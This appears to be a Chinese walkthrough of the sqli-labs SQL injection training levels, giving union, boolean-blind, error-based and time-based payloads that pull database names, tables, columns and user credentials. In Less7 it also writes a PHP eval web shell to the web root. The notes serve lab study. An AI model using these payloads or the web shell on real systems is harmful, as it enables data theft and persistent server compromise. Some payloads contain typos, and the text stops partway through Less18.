[TOC]

## 常用函数


| 函数名称             | 函数功能           | 函数名称       | 函数功能                                       |
| -------------------- | ------------------ | -------------- | ---------------------------------------------- |
| system user()        | 系统用户名         | concat()       | 没有分隔符地连接字符串                         |
| user()               | 用户名             | concat_ws()    | 含有分隔符地连接字符串                         |
| current_user()       | 当前用户名         | group_concat() | 连接一个组的所有字符串，并以逗号分隔每一条数据 |
| session_user()       | 连接数据库的用户名 | load_file()    | 读取本地文件                                   |
| database()           | 数据库名           | into outfile   | 写文件                                         |
| version()            | 数据库版本         | ascii()        | 字符串的 ASCII 码值                            |
| @@datadir            | 数据库路径         | ord()          | 返回字符串第一个字符的 ASCII 码值              |
| @@basedir            | 数据库安装路径     | mid()          | 返回一个字符串的一部分                         |
| @@version_compile_os | 操作系统           | substr()       | 返回一个字符串的一部分                         |
| count()              | 返回执行结果数量   | length()       | 返回字符串的长度                               |

| 函数名称       | 函数功能                                                     |
| -------------- | ------------------------------------------------------------ |
| left()         | 返回字符串的最左面的几个字符                                 |
| floor()        | 返回小于或等于 x 的最大整数                                  |
| sleep()        | 让此语句运行 N 秒钟                                          |
| if()           | >SELECT IF(1>2,2,3); -> 3                                    |
| char()         | 返回整数 ASCII 代码字符组成的字符串                          |
| STRCMP()       | 比较字符串内容                                               |
| IFNULL()       | 假如参数 1 不为 NULL，则返回值为参数 1，否则其返回值为参数 2 |
| exp()          | 返回 e 的 x 次方                                             |
| rand()         | 返回 0 和 1 之间的一个随机数                                 |
| extractvalue() | 第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc 第二个参数：XPath_String (Xpath 格式的字符串) 作用：从目标 XML 中返回包含所查询值的字符串 |
| updatexml()    | 第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc 第二个参数：XPath_String (Xpath 格式的字符串) 第三个参数：new_value，String 格式，替换查找到的符合条件的数据作用：改变文档中符合条件的节点的值 |

## Less1

>   源码：
>   `$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";`

**如果单引号没有报错：将magic_quotes_gpc改为off**

**order by 之后，尽心union select 的时候，要将id 改为一个不存在的值**

1.  database()查看当前数据库，或者group_concat(schema_name) from information_schema.schemata--+

2.  group_concat(table_name) from information_schema.tables where table_schema='security'--+

3.  group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users'--+

4.  group_concat(id,username,password),3 from security.users--+

    或：

    group_concat(id,'\~',username,'\~',password),3 from security.users where id=2--+

## Less2

>   源码：
>   `$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";`

**输入id=2-1**，发生变化，是数字型注入

## Less3

>   源码：
>   `$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";`

字符型，闭合为')

## Less4

>   源码
>   `$id = '"' . $id . '"';`
>   `$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";`

使用双引号和括号闭合

## Less5

```php
{
    $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
    $result=mysql_query($sql);
    $row = mysql_fetch_array($result);
	if($row)
	{
        echo '<font size="5" color="#FFFF00">';	
        echo 'You are in...........';
        echo "<br>";
    	echo "</font>";
  	}
	else 
	{	
        echo '<font size="3" color="#FFFF00">';
        print_r(mysql_error());
        echo "</br></font>";	
        echo '<font color= "#0000ff" font size= 3>';	
	}
}
	else { echo "Please input the ID as parameter with numeric value";}
```

### 基于布尔的盲注

只有显示或不显示，比如：

>   id=1' and left(version(),1)=5--+
>
>   id=1' and length(database())=8--+

以上判断都是正确的

 1.获取数据库名：

先获取数据库长度后...

二分......

猜测数据库第一位：

>   id=1' and left(database(),1)='s'--+

猜测第二位：

判断第二位是否大于a：

>   id=1' and left(database(),2)>'sa'--+

后续同样......

也可以：


>id=1' and ascii(substr(database(),0,1))='s'--+

2.获取表名：substr()，ascii()

获取表的长度：

>   id=1' and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)>0--+

获取第一个表的第一位：

>   id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101--+

获取第一个表的第二位：

>   id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=108--+

第一个表获取完了，那第二个表呢？？

limit 1,1

3.获取列名：

获取列长度

>   id=2' and (select length(column_name) from information_schema.columns where table_name=emails limit 0,1)=1--+



>   id=1' and ascii(substr((selece colunm_name from information_schema.columns where table_name=emails limit 0,1),0,1))='a'--+



或：

判断选择的users表中是否有us**的列：

>   id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^us[a-z]' limit 0,1)--+

是否有username列：

>   id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^username' limit 0,1)--+

同样搞出其他的......

4.获取内容：

假设得到id和email_id两个列

先查个数：

>   id=1' and (select count(*) from security.users.emails)=1--+

之后查长度：

>   id=1' and (select length(email_id) from security.users.emails)=1--+

最后是内容：

>   id=1'and ascii(substr((select email_id from emails limit 0,1),1,1))>'a'--+

### 基于报错的盲注

由于源代码中出现了`print_r(mysql_error)`，导致报错注入的可行，若是源码中未将错误信息打印，则不能进行报错注入

基于报错的有很多，这里写两个：

几个有用函数：

-   updatexml()：对xml进行查询和修改
-   extractvalue()：对xml进行查询和修改，最大长度为32，要获取后面的，使用substring()

比如：

**updatexml():**

>   id=1' and UpdateXml(1,concat(0x7e,(SELECT schema_name from information_schema.schemata limit 1,1),0x7e),1)--+

>   id=1' and UpdateXml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)--+

等等等......

**extractvalue():**

>   id=1' and extractvalue(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))--+

等等等，和正常注入都一样了......

## Less6

闭合与less5不同

>   `$id = '"'.$id.'"';`
>   `$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";`

## Less7

这关是向服务器写一句话写入文件，之后菜刀连接。

写入的话需要权限：secure_file_priv的值

secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。

1、当secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出

2、当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下

3、当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制

注意：
 1、outfire 后面的路径为绝对路径且存在
 2、要有足够的权限
 3、注入的内容也可以是字符串，句子
 4、要想注入新内容，需要新的文件名

>   ?id=-1')) union select 1,"<?php @eval($_POST['chopper']);?>",3  into outfile "D:\\phpStudy\\PHPTutorial\\WWW\\123456.php" --+

## Less8

单引号

当然，布尔和时间盲注也OK。但是报错注入就不OK了。

## Less9

单引号闭合的时间注入

### 基于时间的盲注

猜库：

>   id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+

猜表：

>   id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,1,sleep(5))--+

第二位：

>   id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),2,1))=101,1,sleep(5))--+

第二个表：

>   id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 1,1),1,1))=101,1,sleep(5))--+

猜列：

>   id=1' and if(ascii(substr((select column_name from information_schema.colunms where table_name='users' limit 0,1),1,1))=105,1,sleep(5))--+

猜值：

>   id=1' and if(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))--+

## Less10

双引号闭合的时间注入

和上一关一样。

## Less11

username： admin' #

111' union select 1,database()#

等等等，后面的和get的就都一样了。

## Less12

双引号和括号

其他和Less11相同

## Less13

将提示信息都注释掉了，可以采用布尔盲注。

## Less14

双引号，报错注入

## Less15

单引号，可以布尔盲注或时间盲注。

## Less16

双引号，同15

## Less17

```php
function check_input($value)
	{
	if(!empty($value))
		{
		// truncation (see comments)
		$value = substr($value,0,15);
		}

		// Stripslashes if magic quotes enabled
		if (get_magic_quotes_gpc())
			{
			$value = stripslashes($value);
			}

		// Quote if not a number
		if (!ctype_digit($value))
			{
			$value = "'" . mysql_real_escape_string($value) . "'";
			}
		
	else
		{
		$value = intval($value);
		}
	return $value;
	}

```

这一关对usname进行过滤，解释下上面用到的函数;

-   addslashes()函数

    对预定义的字符进行转义，默认php对所有的get，post，Cookie数据运行addslashes()函数

    预定义字符：

    >   单引号，双引号，反斜杠

-   stripslashes()函数

-   

    删除addslashes()函数添加的转义反斜杠

-   mysql_real_escape_string()函数

    转义特殊字符，比如：单引，双引，\，\x00等

对usname进行了，上述过滤，但是password没有，所以对password进行注入。

## Less18

这关对uname和passwd都进行了检查，